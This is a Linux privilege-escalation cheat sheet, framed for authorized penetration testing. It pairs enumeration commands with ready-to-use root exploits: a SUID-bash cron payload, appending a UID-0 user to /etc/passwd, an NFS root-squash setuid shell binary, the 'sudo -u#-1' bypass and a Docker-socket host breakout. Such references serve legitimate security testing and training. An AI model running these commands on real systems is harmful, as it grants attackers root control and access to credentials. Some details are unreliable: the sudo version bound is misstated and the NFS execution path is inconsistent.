# 🐧 Linux Enumeration & Privilege Escalation 

> **Purpose:** A practical collection of commands and techniques for enumerating Linux systems and performing privilege escalation during **authorized penetration testing or security assessments only**.

---

## 🔍 Enumeration

### 📌 System Information

#### Distribution & Version

```bash
cat /etc/*-release
```

#### Kernel Version

```bash
cat /proc/version
uname -a
```

---

### 🌱 Environment Variables

```bash
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.zshrc
```

---

### 🕘 User Command History

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

---

### ⚙️ Running Processes

```bash
ps aux
```

---

### 🌐 Network Information

#### Interfaces

```bash
ifconfig
ip addr
```

#### Active Connections & Listening Ports

```bash
netstat -ant
ss -lntp
```

#### DNS & Host Mapping

```bash
cat /etc/resolv.conf
cat /etc/hosts
```

---

### 👥 Users, Groups & Passwords

```bash
cat /etc/passwd
cat /etc/shadow
```

---

## 🗄️ Extracting Database Information

### PostgreSQL

```bash
su postgres
psql
```

```sql
\l                 -- list databases
\c <database>      -- select database
\d                 -- list tables
SELECT * FROM <table>;
```

#### Read Files via COPY

```sql
CREATE TABLE demo(t text);
COPY demo FROM '<filename>';
SELECT * FROM demo;
```

---

### SQLite

```bash
sqlite3 <database.db>
```

```sql
.tables
SELECT * FROM <table>;
```

---

### MySQL

```bash
mysql -u root -h localhost -p
```

```sql
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
```

---

### 📝 Other Enumeration Tips

* Review web server files: `/var/www/html`
* Inspect log files for credentials and tokens

---

## 🚀 Privilege Escalation

### ⏰ Crontab

#### Enumeration

```bash
cat /var/log/cron.log
cat /etc/crontab
```

#### Exploitation Example

```bash
echo "chmod +s /bin/bash" >> script.sh
```

---

### 🔐 SUID Binaries

#### Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
id
find / -perm -u=s -type f -group <group> 2>/dev/null
```

#### Exploitation

➡️ Refer to **GTFOBins**

---

### 🧬 Linux Capabilities

#### Enumeration

```bash
getcap -r / 2>/dev/null
```

#### Exploitation

➡️ Refer to **GTFOBins**

---

### 🧑‍💻 Sudo Privileges

#### Enumeration

```bash
sudo -l
cat /etc/sudoers
```

#### Run Command as Another User

```bash
sudo -u <username> <command>
```

#### Exploitation

➡️ Refer to **GTFOBins**

---

### 🧨 Writable /etc/passwd or /etc/shadow

#### Enumeration

```bash
ls -la /etc/passwd
ls -la /etc/shadow
```

#### Exploitation

```bash
echo "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

---

### 📡 NFS Root Squashing

#### Detection (Target)

```bash
cat /etc/exports
```

#### Attacker – Discover Shares

```bash
showmount -e <ip>
rpcinfo <ip>
```

#### Mount Share (Attacker)

```bash
mkdir /tmp/1
mount -o rw,vers=2 <ip>:/<nfs_directory> /tmp/1
```

#### Create SUID Binary (Attacker)

```bash
echo 'int main(){setgid(0);setuid(0);system("/bin/bash");return 0;}' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

#### Exploit (Target)

```bash
/tmp/x
id
```

---

### 🧪 Sudo < 1.28 Vulnerability

```bash
sudo -u#-1 /bin/bash
```

---

### 🐳 Docker Breakout

#### Find Docker Socket

```bash
find / -name docker.sock 2>/dev/null
```

#### List Images

```bash
docker images
```

#### Exploitation

```bash
docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
```

---

## 🧰 Linux Enumeration Tools

### LinPEAS

```bash
./linpeas.sh
```

Repo: **PEASS-ng/linPEAS**

---

### pspy (Process Snooping)

```bash
./pspy64
```

Repo: **pspy**

---

### Linux Exploit Suggester

```bash
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh --uname <uname-string>
```

Repo: **linux-exploit-suggester**

---

### Unix Privesc Check

```bash
./unix-privesc-check
```

Repo: **unix-privesc-check**

---

✅ **End of Linux Enumeration & Privilege Escalation Cheat Sheet**
